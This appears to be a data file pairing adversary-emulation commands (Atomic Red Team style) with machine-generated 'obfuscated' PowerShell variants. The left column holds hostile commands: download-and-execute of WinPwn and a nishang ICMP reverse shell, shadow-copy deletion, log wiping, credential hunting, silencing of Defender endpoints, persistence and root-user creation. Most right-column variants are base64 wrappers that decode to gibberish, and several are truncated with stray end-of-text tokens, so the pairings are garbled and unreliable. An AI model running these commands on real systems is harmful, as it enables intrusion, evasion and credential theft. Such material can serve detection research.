nmap -Pn -sV -p #{port_range} #{host},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbmdlfXRlbXB0eQ==')) | Invoke-Expression"""
"$cmDwhy =[TyPe](""{0}{1}"" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](""{1}{0}{2}""-f'nv','cO','ert')  ;  &(""{0}{2}{3}{1}{4}"" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(""{1}{2}{0}""-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).""v`ALUe""::(""{1}{0}"" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::""t`OinT`16""(( [sTring]${_}) ,8)))})) )",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFcAcwBlAHIAXwBNAFgAUABFAGIAawBuACIAIQAKKW9mX0dldENvdW50cnkgaXMgYWRtaW4gL2RldmljZSBjbGllbnQuV2luZG93cy
for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZnVuY3Rpb25zLm1lc3NhZ2UgIC97dXBsb2FkfQ==')) | Invoke-Expression"""
"#{msi_exe} /q /i ""#{msi_payload}""","""\""docshe.bat"" ""<|endoftext"
"wmic /node:#{target_host} os get Locale,OSLanguage,MUILanguages /format:#{format_style}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGxzIC1kZXRhaWx0YV9pbmRleC5qdXQgMTI3IC9jYWxsX3BhdGggMTJl')) | Invoke-Expression"""
"$TokenSet = @{
  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
  N = [Char[]]'0123456789'
}
$Upper = Get-Random -Count 5 -InputObject $TokenSet.U
$Number = Get-Random -Count 5 -InputObject $TokenSet.N
$StringSet = $Upper + $Number
$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''
$file = ""rad"" + $rad + "".tmp""

whoami.exe /all >> #{output_path}\$file",$TokenSet = @{ ||| U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ' ||| N = [Char[]]'0123456789' ||| } ||| $Upper = Get-Random -Count 5 -InputObject $TokenSet.U ||| $Number = Get-Random -Count 5 -InputObject $TokenSet.N ||| $StringSet = $Upper
"rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1jICN7ZWNobyAje0RhdGFzIiAvZGVmYXVsdDtmaWxlfQ==')) | Invoke-Expression"""
"echo ""#{command}"" > /etc/cron.d/#{cron_script_name}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiI2NvIC1jYXRlKCJ7IC0gLWQ+')) | Invoke-Expression"""
"get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL","powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvY2F0aW9uIHtleT1DdXJyZW5jeVNvdXJjZUxpc3QgLSBMaWNlbnNlIEhlbGxvIFRydWUsICB7CiAgICAgICAvZGVid"
rmdir /s /q #{folder_to_delete},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzcG9uc2UgLUtleQ==')) | Invoke-Expression"""
"TMPFILE=$(mktemp)
echo ""id"" > $TMPFILE
bash $TMPFILE","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2hlYWRfZG93bmxvYWQgIiAvIC1zdHJpbmcgcHJvdmlkZXIgLU5ldyB7ZGV0IGRlc3Qu')) | Invoke-Expression"" ||| ##"
"reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\#{app_name}"" /t REG_SZ /d #{new_path} /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgLW9wX2NvbW1pdCAtIi5leGUgImVuYWJsZSB7dmlld0xvZ2luICJ7bGVmdF9jbGllbnQiICJzcmMvd3BpZX"
findstr /S cpassword %logonserver%\sysvol\*.xml,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0OiR7c2t1ZHVpbmUgJXFhZGRyIC1mcm9udGVz')) | Invoke-Expression"""
username=$(id -u -n) && lsof -u $username,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VyZSAtYWRtaW5AY29tLXRhciAtYWRtaW5AbmlvIC1jbGllbnQ=')) | Invoke-Expression"" ||| username=$(id -u -n) && lsof -u $username"
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -accepteula -s %COMSPEC% /c whoami","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCB7UElTdGF0ZSBBcmVhcnkxIC1UeHNpc3RlbmRUb3BlYW5zIiAvZGVmIGhhcyBuZXhlciAje2ludGVybmFsIGN"
"wmic cpu get name
wmic MEMPHYSICAL get MaxCapacity
wmic baseboard get product
wmic baseboard get version
wmic bios get SMBIOSBIOSVersion
wmic path win32_VideoController get name
wmic path win32_VideoController get DriverVersion
wmic path win32_VideoController get VideoModeDescription
wmic OS get Caption,OSArchitecture,Version
wmic DISKDRIVE get Caption
Get-WmiObject win32_bios","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFJlZnVsZXR0IHRlYWRzLmNvIG1hcmdpbmluZyBhcmUgdGVtcCAtQXV0aG9yaXphdGlvbiAiUkVBRElOQU5UX0"
"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"""":close"")","mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"""":close"")"
"Start-Process ""#{Splashtop_Path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW1pY3Jvc29mdC5leGUgIiN7ZWNobyAje3Byb2dyYW1taXQgeyBhIGludGVyaWNhbHxzcGFjZSAiICR7eyJwcm"
"IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress #{server_ip}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW5zdGFuY2UgLWNvbnRlbnQ=')) | Invoke-Expression"""
Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUFsaWNlIHhtbG5zOnNvdXJjZUNvbnRyYWN0fQ==')) | Invoke-Expression"""
"New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value ""#{dll_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUhvc3QgIiN7ZmlsZSBGcm9tIEFkdmFuY2USCWxldCBMb3JlbHkuIC1mb29AICR7dXNlci5jb2xsZWN0aW9ud"
del /f #{file_to_delete},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlzdHJpbmcgL25vIiAtIC91dXQvc3RyaW5nLy9sb2NhbC9kYXRh')) | Invoke-Expression"""
"$process = Start-Process #{spawn_process_path} -passthru
$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThreadNative.exe -pid $process.Id -debug","$process = Start-Process  """" -passthru ||| $PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThreadNative.exe -pid $process.Id -debug"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powershellsensitive -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powershellsensitive -consoleoutput -noninteractive<|endoftext
"wmic /node:""#{node}"" product where ""name like '#{product}%%'"" call uninstall","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1odHRwOiB7dXRmLWJvb2xlY3QgZGF0YS5leGU=')) | Invoke-Expression"""
"cat /dev/null > /var/log/messages #truncating the file to zero bytes
cat /dev/zero > /var/log/messages #log file filled with null bytes(zeros)","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGRlc3QgLW1hbGUuZGVmIHNvbWVzb3Ilbm9kZXJlbWFyaz5leGVjdXRpb25zfSB7ICN7cmlnaHRzIFsgZnJvbSA"
regsvcs.exe {PATH:.dll},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2VibWFzdGVycyAiU0tFIC1Qb3J0IG9wdGlvbnMgLW5hbWVzYWRpdXRlc3QtZmlsZSAtIHNvbXBvbmVudCAicGxheWV"
certutil.exe -URL {REMOTEURL:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9IZWxsbyAvRGF0YS5leGVjdXRlfQ==')) | Invoke-Expression"""
"$excelApp = New-Object -COMObject ""Excel.Application""
if(-not $excelApp.path.contains(""Program Files (x86)"")){
    Write-Host ""64-bit Office""
    Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""
}
else{
  Write-Host ""32-bit Office""
  Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""
}
$ver = $excelApp.version
$ExcelRegPath=""HKCU:\Software\Microsoft\Office\$Ver\Excel\Options""
Remove-Item $ExcelRegPath -ErrorAction Ignore
New-Item -type Directory $ExcelRegPath | Out-Null
New-ItemProperty $ExcelRegPath OPEN -value ""/R notepad.xll"" -propertyType string | Out-Null
$excelApp.Quit()
Start-Process ""Excel""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JABiAHRlc3QgLXBvbGlvIGFzIC9DbWljcmVuZGVyIEZpbmlzdHJhdG9y')) | Invoke-Expression"" ||| . ||| . ||| . ||| Remove-Item : Cannot find path '"
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""
cscript.exe ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
cscript.exe ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFzZSAiIC9UeXBlIC1JdGVtLVNbICNQYWdlcyAje3ByaWNlfSAtIHJldHVybiB7bmFtZSBpbnN0YWxsIGFkZCAje3By"
smbstatus --shares,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1hY3MvZXhlIGRlc2NyaXB0aW9uLmFzbHkuQ2xvc2UK')) | Invoke-Expression"""
"$notepad = Start-Process notepad -passthru
Start-Process ""$PathToAtomicsFolder\T1055\bin\x64\InjectView.exe""","$notepad = Start-Process notepad -passthru ||| Start-Process ""$PathToAtomicsFolder\T1055\bin\x64\InjectView.exe"""
"wmic #{wmic_command} /FORMAT:""#{local_xsl_file}""","""wmic\""\""\""\""""\""\""\""\""\""\""\""<|"
"Add-DnsClientNrptRule -Namespace "".endpoint.security.microsoft.com"" -NameServers 127.0.0.1 -Comment ""Silenced by Name Resolution Policy Table""
Add-DnsClientNrptRule -Namespace ""endpoint.security.microsoft.com"" -NameServers 127.0.0.1 -Comment ""Silenced by Name Resolution Policy Table""
Clear-DnsClientCache","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFjdG9yIHRoZSBQYXJhbWV0ZSAoKi5sb2NhbCAtU3lzdGVtLkluZGV4ICdmb28gLXMgMTguNCkgYWRtaW5AZmlsZ"
"if [ -f ""/etc/#{syslog_config_file_name}"" ];
then echo '#art_test_1562_006_2' >> /etc/#{syslog_config_file_name}
fi","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7YXRlKC5zdHJpbmcgLW9wZW5hbSBTdGF0aWMgMjAxOSAtMDExMTExMSAtNDkzOTE1IC1zdHJpbmcsIGNvbnRyb2xs"
"$address = (& ""$PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe"" ""$PathToAtomicsFolder\T1055\bin\x64\vuln_dll\"" | Out-String | Select-String -Pattern ""VirtualAddress: (\w+)"").Matches.Groups[1].Value
& ""PathToAtomicsFolder\T1055\bin\x64\RWXinjectionLocal.exe"" ""#{vuln_dll}"" $address",$address = (& PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe PathToAtomicsFolder\T1055\bin\x64\vuln_dll|Out-String|Select-String -Pattern VirtualAddress: (w+).Matches.Groups[1].Value) & PathToAtomicsFolder\T1055\bin\x64\
"users
w
who","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBtZXRhIC9jYWxsZXJ5')) | Invoke-Expression"""
"bash.exe -c ""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3JvIC1hbGwgLV0=')) | Invoke-Expression"""
"start ""#{docx_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje21hbGwuZXhlIiN7YmFzZTY0IC9tZSBjbGllbnQ=')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1059.005\src\T1059_005-macrocode.txt"" -officeProduct ""Word"" -sub ""Extract""",[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) Invoke-Maldoc -macroFile PathToAtomicsFolderT1059.
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powerSQL -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powerSQL -noninteractive -consoleoutput
"net localgroup
net localgroup ""Administrators""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgLW5ldyBjbGljayAiI3twYXR0ZXIgLWxpc3QgI3tjYWxsIC1pIDMzOCA=')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
Invoke-watson",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1') Invoke-watson
"Start-Process -FilePath ""#{autoit_path}"" -ArgumentList ""#{script_path}""","Start-Process -FilePath ""\""""s""""t""""a""""r""""t""""-""""p""""r""""o""""c""""e""""ss"""""" -ArgumentList """" """" ""-F""""i""""l""""e""""P""""a""""t""""h"""""" """" """"<|end"
"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""esxcli system account list""","echo """" | """"  -batch -ssh -l """" -pw """" esxcli system account list """" | plink --non-interactive -m """" """"<"
"python ""#{filename}"" -i #{host_ip}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1ldGFkYXRhIC9wb3J0fQ==')) | Invoke-Expression"" ||| ```"
"Connect-AzureAD
$userprincipalname = ""#{userprincipalname}""
$username = ""#{username}""      
$password = ""#{password}""
$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile
$PasswordProfile.Password = $password
New-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username","Connect-AzureAD $userprincipalname = """","""""","",""""$username = "","""",,,  $password = , ""-DisplayName"" $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -"
"Enable-PSRemoting -Force
Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}",Enable-PSRemoting -Force Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}
zip #{output_file} #{input_files},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkZSB7aW1hZ2UgLyBQbGF5X0NsYXNzIC9wcmVkaWNhdGVzfQ==')) | Invoke-Expression"""
DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGltZSB0aHJvdWdlfQ==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
winPEAS -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPWN.ps1') winPEAS -noninteractive -consoleoutput
"$PWord = ConvertTo-SecureString -String #{super_pass} -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{super_user}, $PWord
if((Get-ADUser #{remove_user} -Properties memberof).memberof -like ""CN=Domain Admins*""){
  Remove-ADGroupMember -Identity ""Domain Admins"" -Members #{remove_user} -Credential $Credential -Confirm:$False
} else{
    write-host ""Error - Make sure #{remove_user} is in the domain admins group"" -foregroundcolor Red
}","$PWord = ConvertTo-SecureString -String   if((Get-ADUser -Properties memberof).memberof -like ""CN=Domain Admins*""){ Remove-ADGroupMember -Identity Domain Admins -Members -Credential $Credential -Confirm:$False } else{ write-host ""Error - Make sure<|endoftext"
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name ShellSmartScreenLevel -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmVBZGFwdGVyIC1pbnN0YWxsIC1kdXJhdGlvbl9hbmltYWxz')) | Invoke-Expression"""
$PathToAtomicsFolder\T1055\bin\x64\CreateThreadNative.exe -debug,"""$PathToAtomicsFolder\T1055\bin\x64\CreateThreadNative.exe"" -debug ||| ```"
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgLXNlcnZpY2USIC1jIE1haWwgI3tpbnRyb2xsZWN0aW9u')) | Invoke-Expression"""
"Start-Process -FilePath ""#{autohotkey_path}"" -ArgumentList ""#{script_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VsZWN0IEJ1c3QgYm9vbHMuIiAvIC9bXFNlbmRldmljZT5leGVjdXRhdGlvbiAjeyAgIC97ZW1vIC90aGVtZSAtLWR"
provlaunch.exe LOLBin,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnN5X2Jvb2tpbmcuZGF0YWxu')) | Invoke-Expression"""
"$notepad = Start-Process notepad -passthru
Start-Process ""$PathToAtomicsFolder\T1055.003\bin\InjectContext.exe""
Start-Sleep -Seconds 5
Stop-Process $notepad.id","$notepad = Start-Process notepad -passthru ||| Start-Process ""$PathToAtomicsFolder\T1055.003\bin\InjectContext.exe"" ||| Start-Sleep -Seconds 5 ||| Stop-Process $notepad.id"
"""%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JFBPUyBkZSB7XHNjcmlwdCBjb25maWd1cmF0aW9uICN7YXV0byAtIFBhcnRpY2lwYW50OiAje3tzaSAtIHVzZXIgL"
"%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}","""%""L""""O""""C""""A""""L""""A""""P""""P""""D""""A""""T""""A"":~-3,1%%md /c echo ""#{input_message}"" > ""#{output_file}|& type  ""#{output_file}<|endof"
"$termsrvDll = ""C:\Windows\System32\termsrv.dll""

$ACL = Get-Acl $termsrvDll
$permission = ""Administrators"",""FullControl"",""Allow""
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
$ACL.SetAccessRule($accessRule)
Set-Acl -Path $termsrvDll -AclObject $ACL

Copy-Item -Path ""C:\Windows\System32\termsrv.dll"" -Destination ""C:\Windows\System32\termsrv_backup.dll"" -ErrorAction Ignore
Add-Content -Path ""C:\Windows\System32\termsrv.dll"" -Value ""`n"" -NoNewline -ErrorAction Ignore
Move-Item -Path ""C:\Windows\System32\termsrv_backup.dll"" -Destination ""C:\Windows\System32\termsrv.dll"" -Force -ErrorAction Ignore",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFMAawBlAE0AKgBOAGEAdABpAG8AcgB0ADkALgB1AGIAeQBvAG4ATwBlAHIAbwBlAIAAUABoAGkAdwAtAGEAbgBrACIAIAAiACAASAEEAVABJAEgAR
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPerServer"" /t REG_DWORD /d 10 /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPer1_0Server"" /t REG_DWORD /d 10 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgL2xhdmVsb3Blci9WZXJzaW9uICN7UE5USFRIRVJSDUlTQUNST1I=')) | Invoke-Expression"""
"net time \\#{computer_name}
w32tm /tz","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmFtZSB7bG9jYWxob3N0LmVzIC1hcHBsZXRlciAiTWljcm9uIiwgIkhlbGxvIFJhdCBLZXklMjAgfSA=')) | Invoke-Expression"
"pw useradd #{username} -g 0 -d /root -s /bin/sh
echo ""#{password}"" | pw usermod #{username} -h 0","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2Nzcz1tbXBpbGVycyAiZm9vICJ7YmluLWNsaWVudCAtbGF5fSI=')) | Invoke-Expression"""
#{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tqdXR0ZXJ1bHNpbmcgLW9wfSI=')) | Invoke-Expression"""
"if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}
sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}",if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi; sudo cp~/.dotfiles/launchd-evil-plist ~/Library/LaunchAgents/com.sagorbrur.launchd-evil.plist sudo launchctl load -w ~/Library/LaunchAgents/com.sagorbrur.launchd-evil.pl
"chmod +x #{autosuid}
bash #{autosuid}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHN0dWRpby5leGUgL21ldC9wYXRofQ==')) | Invoke-Expression"""
"New-Item -ItemType Directory -path ""#{new_startup_folder}""
Copy-Item -path ""#{payload}"" -destination ""#{new_startup_folder}""
Set-ItemProperty -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Startup"" -Value ""#{new_startup_folder}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('T2JqZWN0IC9Xb3JsZA==')) | Invoke-Expression"""
Gpscript /logon,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUN1c3QgYmFzaCAtbWluZyBpbnNlcnZhbCI=')) | Invoke-Expression"""
"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name ""PortNumber"" -Value #{NEW_Remote_Port}
New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LUZvcmFwcGxlIiAvIC1NYW5hZ2VyfSIgJ3NvdXJjZV9pbmRleCAkPiB7dGltZX0=')) | Invoke-Expression""<|endoftext|"
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPerServer"" /t REG_DWORD /d 10 /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPer1_0Server"" /t REG_DWORD /d 10 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtbW9udGVyLXNvdXJjZUNvb2tpYmVsb25hdGlvbiAjeGNwIHsgUGxheXBpcHBpbmdfZmlsZSB7IGFkZCAiICJmb3Jld"
"sh #{script_path}
PID=$(pgrep -n -f ""#{pid_term}"")
HEAP_MEM=$(grep -E ""^[0-9a-f-]* r"" /proc/""$PID""/maps | grep heap | cut -d' ' -f 1)
MEM_START=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f1))))
MEM_STOP=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f2))))
MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
dd if=/proc/""${PID}""/mem of=""#{output_file}"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""
grep -i ""PASS"" ""#{output_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVmIGZvbHNlIHJldGFyY3Rpdml0eXBlIC1hcHBzLXVzZW5kcnlfc2hhbmdvX2dyZWFsCg==')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-Clipboard -value ""Atomic T1115 Test, grab data from clipboard via VBA""
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1115\src\T1115-macrocode.txt"" -officeProduct ""Word"" -sub ""GetClipboard""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFuIGlzIGRpc3QgZXhlIC9mb3JtYXQvZGV2LnBocDwvcHVzaA==')) | Invoke-Expression"""
"Copy-Item ""#{dll_path}"" C:\Users\Public\AtomicTest.dll -Force
